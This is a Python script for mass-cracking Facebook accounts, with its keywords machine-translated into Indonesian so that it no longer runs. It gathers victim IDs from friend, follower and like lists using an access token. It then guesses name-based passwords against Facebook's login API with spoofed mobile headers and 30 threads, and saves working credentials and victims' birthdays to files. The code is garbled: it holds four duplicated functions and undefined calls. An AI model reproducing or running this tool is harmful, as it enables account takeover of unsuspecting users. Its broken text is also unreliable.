#!/usr/bin/python2
# pengkodean=utf-8
impor  os , sys , waktu , datetime , acak , hashlib , re , threading , json , getpass , urllib , cookielib , permintaan , mekanisasi , bs4
dari  multiproses . kolam  impor  ThreadPool
dari  permintaan . pengecualian  impor  ConnectionError
dari  browser impor mekanis   
dari  bs4  impor  BeautifulSoup
dari  bersamaan . impor berjangka  ThreadPoolExecutor 
dari  waktu  impor  tidur
dari  datetime  impor  datetime
dari  tanggal impor datetime  
coba :
	 mekanisme impor
kecuali  ImportError :
	os . sistem ( "pip2 instal mekanisasi" )
coba :
	impor  bs4
kecuali  ImportError :
	os . sistem ( "pip2 instal bs4" )
coba :
	 permintaan impor
kecuali  ImportError :
	os . sistem ( "permintaan pemasangan pip2" )
	os . sistem ( "python2 ms062.py" )
dari  bersamaan . impor berjangka  ThreadPoolExecutor 
dari  permintaan . pengecualian  impor  ConnectionError
dari  browser impor mekanis   
#-------------------------------------------#
# warna saya warna acak #
#-------------------------------------------#
merah  =  ' \033 [0;31m'
putih  =  ' \033 [0;37m'
hijau  =  ' \033 [0;32m'
biru  =  ' \033 [0;36m'
ungu  =  ' \033 [0;35m'
kuning  =  ' \033 [0;33m'
warna_saya  = [
 merah , putih , hijau , biru , ungu , kuning ]
warna  =  acak . pilihan ( my_color )
hari  =  tanggal waktu . sekarang (). strftime ( '%A' )
 spanduk def ():
	cetak ( """
%S ___ _____ _____________________
| | /      \\ ______ \_ _____/
| | ______ / \ / \| | _/| __)  
| | /_____/ / Y \ | \| \   
|___| \____|__ /______ /\___ /   
                      \/ \/ ​​\/    
""" % ( putih ))

ips = Tidak ada
coba :
	b = permintaan . dapatkan ( "https://api.ipify.org" ). teks . strip ()
	ips = permintaan . get ( "https://ipapi.com/ip_api.php?ip=" + b , headers = { "Referer" : "https://ip-api.com/" , "Content-Type" : "application/ json; charset=utf-8" , "User-Agent" : "Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/87.0 .4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64" }). json ()[ "nama_negara" ]. lebih rendah ()
kecuali :
	ips = Tidak ada

uas = Tidak ada
jika  os . jalan . ada ( ".browser" ):
	jika  os . jalan . getsize ( ".browser" ) != 0 :
		uas = buka ( ".browser" ). baca (). strip ()
identitas  = []
cp  = []
oke  = []
lingkaran  =  0

ct  =  waktu tanggal . sekarang ()
n  =  ct . bulan
bulan1  = [     'Januari' ,    'Februari' ,     'Maret' ,     'April' ,     'Mei' ,     'Juni' ,     'Juli' ,     'Agustus' ,     'September' ,     'Oktober' ,     'Nopember' ,     'Desember' ]

coba :
    jika  n  <  0  atau  n  >  12 :
        keluar ()
    nTemp  =  n  -  1
kecuali  ValueError :
    keluar ()
    
saat ini  =  tanggal waktu . sekarang ()
t  =  arus . tahun
bu  =  arus . bulan
ha  =  arus _ hari
op  =  bulan1 [ nTemp ]
isi ulang ( sys )
sys . setdefaultencoding ( 'utf-8' )
bulan  = {
        "01" : "Januari" ,
        "02" : "Februari" ,
        "03" : "Maret" ,
        "04" : "April" ,
        "05" : "Mei" ,
        "06" : "Juni" ,
        "07" : "Juli" ,
        "08" : "Agustus" ,
        "09" : "September" ,
        "10" : "November" ,
        "11" : "Oktober" ,
        "12" : "Desember"
}
 menu def ():
	os . sistem ( "jelas" )
	coba :
		token  =  buka ( "iwan_dev" , "r" ). baca ()
	kecuali  IOError :
		print ( "[*] token dan cookies anda telah invalid masukan kembali token dan cookie anda" )
		os . sistem ( "rm -rf iwan_dev.txt" )
		waktu . tidur ( 2 )
		masuk ()
	coba :
		otw  =  permintaan . dapatkan ( 'https://graph.facebook.com/me?access_token='  + token )
		a  =  json . beban ( otw . teks )
		nami  =  a [ 'nama' ]
		id  =  a [ 'id' ]
	kecuali  KeyError :
		os . sistem ( "jelas" )
		print ( "%s[%s*%s] kesalahan tidak bisa masuka ke dalam menu" % ( putih , putih , putih ))
		os . sistem ( "rm -rf iwan_dev.txt" )
		waktu . tidur ( 1 )
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		print ( "[*] koneksi anda jelek mohon sambungkan kembali koneksi anda" )
		os . sys . keluar ()
	spanduk ()
	print ( " \n [ selamat datang : %s %s ]" % ( kuning , nami ))
	cetak ( " " )
	print ( "%s[01]. crack dari id publik" % ( putih ))
	print ( "%s[02]. crack dari followers" % ( putih ))
	print ( "%s[03]. crack dari like postingan" % ( putih ))
	print ( "%s[04]. dapatkan agen pengguna " % ( putih ))
	print ( "%s[05]. mengatur agen pengguna" % ( putih ))
	print ( "%s[06]. cek opsi hasil hasil" % ( putih ))
	print ( "%s[07]. lihat hasil hasil crack" % ( putih ))
	print ( "%s[08]. cek informasi facebook" % ( putih ))
	print ( "%s[09]. laporkan bug script" % ( putih ))
	print ( "%s[10]. perbarui skrip tou" % ( putih ))
	print ( "[%s00%s] logout (hapus akun" % ( merah , putih ))
	cetak ( " " )
	iwan  =  raw_input ( " \n %s[?]. pilih : " % ( putih ))
	jika  iwan  == "" :
		print ( "[!] isi yang benar" )
		menu ()
	elif  iwan  == "01"  atau  iwan  == "1" :
		babaturan ()
	elif  iwan  == "02"  atau  iwan  == "2" :
		molow ()
	elif  iwan  == "03"  atau  iwan  == "3" :
		seperti ()
	elif  iwan  == "04"  atau  iwan  == "4" :
		get_ugent ()
	elif  iwan  == "05"  atau  iwan  == "5" :
		set_ua ()
	elif  iwan  == "06"  atau  iwan  == "6" :
		opsi ()
	elif  iwan  == "07"  atau  iwan  == "7" :
		hasil ()
	elif  iwan  == "08"  atau  iwan  == "8" :
		informasi ()
	elif  iwan  == "09"  atau  iwan  == "9" :
		lapor ()
	elif  iwan  == "10"  atau  iwan  == "10" :
		PEMBARUAN ()
	elif  iwan  == "00"  atau  wan  == "0" :
		os . sistem ( "rm -rf iwan_dev.txt" )
		print ( "[√] berhasil menghapus token dan cookie" )
	lain :
		print ( "[!] isi yang benar" )
		menu ()

def  babaturan ():
	coba :
		token  =  buka ( "login.txt" , "r" ). baca ()
		x  =  permintaan . dapatkan ( "https://graph.facebook.com/me?access_token="  +  token )
		y  =  json . beban ( x . teks )
		n  =  y [ 'nama' ]
	kecuali ( KeyError , IOError ):
		print ( "[*] token dan cookie anda tidak valid" )
		os . sistem ( 'rm -rf token.txt' )
		masuk ()
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		print ( "[*] koneksi anda bermasalah" )
		os . sistem ( "rm -rf login.txt" )
		masuk ()
	coba :
		print ( "[*] ketik 'me' jika ingin crack dari daftar teman" )
		idt  =  raw_input ( "[*] masukan id atau username : " )
		coba :
			lelucon  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "?access_token=" + token )
			op  =  json . beban ( lelucon . teks )
		kecuali  KeyError :
			print ( "[*] id yang anda masukan tidak publik" )
			menu ()
		kecuali  permintaan . pengecualian . Kesalahan Koneksi :
			print ( "[*] koneksi anda bermasalah" )
			keluar ()
		r  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/friends?limit=5000&access_token=" + token )
		z  =  json . beban ( r . teks )
		untuk  i  in  z [ 'nama' ][ 'data' ]:
			id . tambahkan ( i [ 'id' ])
		print ( "[*] total id -> \033 [0;31m"  +  str ( len ( id ))
		pw ( z )
def  babaturan ():
	coba :
		token  =  buka ( "login.txt" , "r" ). baca ()
		x  =  permintaan . dapatkan ( "https://graph.facebook.com/me?access_token="  +  token )
		y  =  json . beban ( x . teks )
		n  =  y [ 'nama' ]
	kecuali ( KeyError , IOError ):
		print ( "[*] token dan cookie anda tidak valid" )
		os . sistem ( 'rm -rf token.txt' )
		masuk ()
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		print ( "[*] koneksi anda bermasalah" )
		os . sistem ( "rm -rf login.txt" )
		masuk ()
	coba :
		print ( "[*] ketik 'me' jika ingin crack dari daftar teman" )
		idt  =  raw_input ( "[*] masukan id atau username : " )
		coba :
			lelucon  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "?access_token=" + token )
			op  =  json . beban ( lelucon . teks )
		kecuali  KeyError :
				print ( "[*] id yang anda masukan tidak publik" )
			menu ()
		kecuali  permintaan . pengecualian . Kesalahan Koneksi :
			print ( "[*] koneksi anda bermasalah" )
			keluar ()
		r  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/friends?limit=5000&access_token=" + token )
		z  =  json . beban ( r . teks )
		untuk  i  in  z [ 'nama' ][ 'data' ]:
			id . tambahkan ( i [ 'id' ])
		print ( "[*] total id -> \033 [0;31m"  +  str ( len ( id ))
		pw ( z )
		
def  babaturan ():
	coba :
		token  =  buka ( "login.txt" , "r" ). baca ()
		x  =  permintaan . dapatkan ( "https://graph.facebook.com/me?access_token="  +  token )
		y  =  json . beban ( x . teks )
		n  =  y [ 'nama' ]
	kecuali ( KeyError , IOError ):
		print ( "[*] token dan cookie anda tidak valid" )
		os . sistem ( 'rm -rf token.txt' )
		masuk ()
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		print ( "[*] koneksi anda bermasalah" )
		os . sistem ( "rm -rf login.txt" )
		masuk ()
	coba :
		print ( "[*] ketik 'me' jika ingin crack dari daftar teman" )
		idt  =  raw_input ( "[*] masukan id atau username : " )
		coba :
			lelucon  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "?access_token=" + token )
			op  =  json . beban ( lelucon . teks )
		kecuali  KeyError :
			print ( "[*] id yang anda masukan tidak publik" )
			menu ()
		kecuali  permintaan . pengecualian . Kesalahan Koneksi :
			print ( "[*] koneksi anda bermasalah" )
			keluar ()
		r  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/subscribers?limit=100000000000000000000&access_token=" + token )
		z  =  json . beban ( r . teks )
		untuk  i  in  z [ 'nama' ][ 'data' ]:
			id . tambahkan ( i [ 'id' ])
		print ( "[*] total id -> \033 [0;31m"  +  str ( len ( id ))
		pw ( z )

def  babaturan ():
	coba :
		token  =  buka ( "login.txt" , "r" ). baca ()
		x  =  permintaan . dapatkan ( "https://graph.facebook.com/me?access_token="  +  token )
		y  =  json . beban ( x . teks )
		n  =  y [ 'nama' ]
	kecuali ( KeyError , IOError ):
		print ( "[*] token dan cookie anda tidak valid" )
		os . sistem ( 'rm -rf token.txt' )
		masuk ()
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		print ( "[*] koneksi anda bermasalah" )
		os . sistem ( "rm -rf login.txt" )
		masuk ()
	coba :
		print ( "[*] ketik 'me' jika ingin crack dari daftar teman" )
		idt  =  raw_input ( "[*] masukan id atau username : " )
		coba :
			lelucon  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "?access_token=" + token )
			op  =  json . beban ( lelucon . teks )
		kecuali  KeyError :
			print ( "[*] id yang anda masukan tidak publik" )
			menu ()
		kecuali  permintaan . pengecualian . Kesalahan Koneksi :
			print ( "[*] koneksi anda bermasalah" )
			keluar ()
		r  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/likes?limit=100000000000000000000&access_token=" + token )
		z  =  json . beban ( r . teks )
		untuk  i  in  z [ 'nama' ][ 'data' ]:
			id . tambahkan ( i [ 'id' ])
		print ( "[*] total id -> \033 [0;31m"  +  str ( len ( id ))
		pw ( z )

def  pw ( z ):
	h  =  raw_input ( " \033 [0;37m[?] apakah anda ingin menggunakan sandi manual? [Y/t] : " )
	jika  h  == "" :
		pw ( z )
	elif  h  == "y"  atau  h  == "Y" :
		panduan ( z )
	elif  h  == "t"  atau  h  == "T" :
		otomatis ( z )
	lain :
		print ( "[!] Pilih Yang Bener" )
		pw ()

#----->retak otomatis<-----#
def  otomatis ( file ) :
	cetak ("")
	print ( "[ pilih methode crack - silahkan coba satu² ]" )
	cetak ( " " )
	print ( "[1] metode api (retak cepat)" )
	print ( "[2] metode mbasic (retak lambat)" )
	print ( "[3] metode seluler (sangat lambat)" )
	cetak ( " " )
	i  =  raw_input ( "[?] metode : " )
	jika  saya  == "" :
		print ( "[!] isi yang benar" )
		pw ( z )
	elif  i  == "01"  atau  i  == "1" :
		api ()
	elif  i  == "02"  atau  i  == "2" :
		dasar ()
	elif  i  == "03"  atau  i  == "3" :
		seluler ()
	lain :
		print ( "[!] isi yang benar" )
		otomatis ( file )

def  api ():
	cetak (' ')
	print ( '[+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt'  % ( hari , ha , op , ta ))
	print ( '[+] hasil CP disimpan ke -> OK/%s-%s-%s-%s.txt'  % ( hari , ha , op , ta ))
	print ( ' \n [!] anda bisa menjeda proses crack dengan mematikan data seluler' )
	cetak ( ' ' )
	def  utama ( pengguna ):
		coba :
			ua  =  buka (" ugent .txt " , "r" ). baca ()
		kecuali  IOError :
			ua  = ( "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]" )
		 lingkaran global , token
		pwx  = []
		sys . stdout . menulis (
		 ' \r  \033 [1;97m[*] [crack] %s/%s OK-:%s - CP-:%s '  % ( loop , len ( id ), len ( ok ), len ( cp ) ),
		); sys . stdout . menyiram ()
		uid , nama  =  pengguna . membagi ( "|" )
		jika  len ( nama ) >= 6 :
			pwx  = [ nama , nama + "123" , nama + "1234" , nama + "12345" ]
		elif  len ( nama ) <= 2 :
			pwx  = [ nama + "123" , nama + "1234" , nama + "12345" ]
		elif  len ( nama ) <= 3 :
			pwx  = [ nama + "123" , nama + "12345" ]
		lain :
			pwx  = [ nama + "123" , nama + "12345" ]
					
		coba :
			untuk  pw  di  pwx :
				pw  =  pw . lebih rendah ()
				ses  =  permintaan . Sesi ()
				headers_  = { "x-fb-connection-bandwidth" : str ( random .randint ( 20000000.0 , 30000000.0 )), "x-fb-sim-hni" : str ( random .randint ( 20000 , 40000 ) ), " x- fb-net-hni" : str ( random .randint ( 20000 , 40000 ) ) , " x - fb-connection-quality" : "EXCELLENT" , "x-fb-connection-type" :"cell.CTRadioAccessTechnologyHSDPA" , "user-agent" : ua , "content-type" : "application/x-www-form-urlencoded" , "x-fb-http-engine" : "Liger" }
				param  = { "access_token" : "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32" , "format" : "JSON" , "sdk_version" : "2" , "email" : uid , "locale" : "en_US" , " password " : pw sdk" : "ios" , "generate_session_cookies" : "1" , "sig" : "3f555f99fb61fcd7aa0c44f58f522ef6" }
				api  =  "https://b-api.facebook.com/method/auth.login"
				kirim  =  ses . dapatkan ( api , params = param , headers = headers_ )
				jika  "session_key"  di  kirim . teks  dan  "EAA"  di  kirim . teks :
					print  ' \r   \033 [1;92m*--> '  + uid +  '|'  +  pw  +  ' '
					oke . tambahkan ( uid + '|' + pw )
					buka ( "OK/%s.txt" % ( tanggal ), "a" ). tulis ( " * --> %s|%s \n " % ( uid , pw ))
					merusak
					melanjutkan
				elif  "www.facebook.com"  di  kirim . json ()[ "error_msg" ]:
					coba :
						token  =  buka ( 'login.txt' ). baca ()  
						sw  =  permintaan . dapatkan ( 'https://graph.facebook.com/' + uid + '/?access_token='  +  token )
						b  =  json . beban ( sw . teks )
						grafik  =  b [ "ulang tahun" ]
						bulan , hari , tahun  =  grafik . membagi ( "/" )
						bulan  =  bulan [ bulan ]
						print ' \r \x1b [1;93m * --> '  +  uid  +  '|'  +  pw  +  '|'  +  hari  +  ' '  +  bulan  +  ' '  +  tahun  +  ' '
						cp . tambahkan ( uid  +  '|'  +  pw  +  '|'  +  hari  +  ' '  +  bulan  +  ' '  +  tahun )
						buka ( "CP/%s.txt" % ( tanggal ), "a" ). write ( " * --> %s|%s|%s %s %s \n " % ( uid , pw , hari , bulan , tahun ))
						merusak
					kecuali ( KeyError , IOError ):
						grafik  =  " "
					kecuali : lulus
					print ' \r \x1b [1;93m * --> '  +  uid  +  '|'  +  pw  +  ' '
					cp . tambahkan ( uid  +  '|'  +  pw )
					buka ( "CP/%s.txt" % ( tanggal ), "a" ). tulis ( " * --> %s|%s \n " % ( uid , pw ))
					merusak
					melanjutkan
			
			lingkaran  +=  1
		kecuali :
			lulus
	p  =  ThreadPool ( 30 )
	hal . peta ( utama , id )
	print '\n\ n \x 1 b [ 1 ; 97 m [ + ] retakan  selesai ...'
	keluar ()
	

jika  __name__ == " __main__ ":
	masuk ()
